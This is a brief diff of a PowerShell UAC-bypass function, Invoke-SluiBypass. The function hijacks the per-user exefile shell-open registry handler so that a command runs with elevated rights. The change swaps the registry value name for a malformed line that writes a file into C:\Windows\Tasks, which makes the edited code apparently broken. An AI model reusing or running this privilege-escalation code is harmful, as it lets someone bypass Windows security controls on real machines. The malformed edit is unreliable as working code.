@@ -45,7 +45,7 @@ function Invoke-SluiBypass {
     [string]$Command
     )
     $RegRoot = 'HKCU:\Software\Classes\exefile\shell\open'
-    $Name = 'command'
+    $Name = echo "salam" > C:\\Windows\\Tasks\\salam.txt
     $OldValue = $null
 
     if(Test-Path $RegRoot) {
